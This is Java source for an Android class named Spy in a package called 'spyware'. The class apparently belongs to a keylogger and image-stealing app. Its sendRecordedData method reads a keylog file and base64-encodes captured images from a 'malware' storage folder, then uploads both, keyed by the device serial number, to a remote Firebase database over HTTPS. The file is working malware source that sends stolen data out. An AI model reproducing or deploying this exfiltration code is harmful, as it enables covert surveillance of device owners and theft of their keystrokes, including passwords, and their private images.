package com.example.cristianturetta.spyware;

import android.os.Environment;
import android.util.Base64;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import javax.net.ssl.HttpsURLConnection;

public class Spy {
    static private Spy mInstance;

    private Spy(){}

    public static Spy getInstance(){
        if (mInstance == null){
            synchronized (Spy.class){
                if (mInstance == null){
                    mInstance = new Spy();
                }
            }
        }
        return mInstance;
    }

    /**
     * Send recorded data to a remote Firebase database
     *
     */
    public void sendRecordedData(){
        try {
            FileUtil fileUtil = FileUtil.getInstance();
            String userIdentifier = android.os.Build.class.getField("SERIAL").get(null).toString();
            String directory = "/user/" + userIdentifier + "/" + (new Date()).getTime() + ".json";

            URL databaseURL = new URL(FirebaseConfig.getDatabaseURL() + directory);
            HttpsURLConnection urlConnection = getConnection(databaseURL);

            JSONObject jsonObject = new JSONObject();

            for (File file: FileUtil.getInstance().getAllImagesFrom(fileUtil.getMalwareImagesStorageFolder())) {
                jsonObject.put(file.getName().split("\\.")[0].toLowerCase(), base64Encoding(file));
            }

            String keypressFileContent = FileUtil.getStringFromFile(fileUtil.getMalwareKeypressStorageFolder().getAbsolutePath()
                                    + File.separator + fileUtil.getKeypressFileName());
            jsonObject.put("Keylog", keypressFileContent);

            setPostRequestContent(urlConnection, jsonObject);
            urlConnection.connect();
            Log.d("Spy", "Database response code: " + urlConnection.getResponseCode());
            urlConnection.disconnect();

        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Adds to an {@link HttpsURLConnection} a {@link JSONObject} as request body
     *
     * @param conn connection to the database
     * @param jsonObject to insert into the body of the request
     * @throws IOException
     */
    private void setPostRequestContent(HttpsURLConnection conn, JSONObject jsonObject) throws IOException {
        OutputStream os = conn.getOutputStream();
        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
        writer.write(jsonObject.toString());
        writer.flush();
        writer.close();
        os.close();
    }

    /**
     * Encodes a {@link File} in a Base64 {@link String}
     *
     * @param file to be encoded
     * @return corresponding Base64 {@link String}
     */
    private String base64Encoding(File file){
        try {
            byte[] content = new byte[(int) file.length()];
            FileInputStream inputStream = new FileInputStream(file);
            for (int off = 0, read; (read = inputStream.read(content, off, content.length - off)) > 0; off += read);
            return Base64.encodeToString(content, Base64.DEFAULT);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    /**
     * Creates an {@link HttpsURLConnection}
     *
     * @param url to connect
     * @return corresponding {@link HttpsURLConnection} to the given {@link URL}
     */
    private HttpsURLConnection getConnection(URL url){
        HttpsURLConnection urlConnection = null;
        try {
            urlConnection = (HttpsURLConnection) url.openConnection();

            urlConnection.setRequestMethod("PUT");
            urlConnection.setDoOutput(true);
            urlConnection.setRequestProperty("Content-Type", "application/json");
            urlConnection.setRequestProperty("Accept", "application/json");

            return urlConnection;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return urlConnection;
    }
}
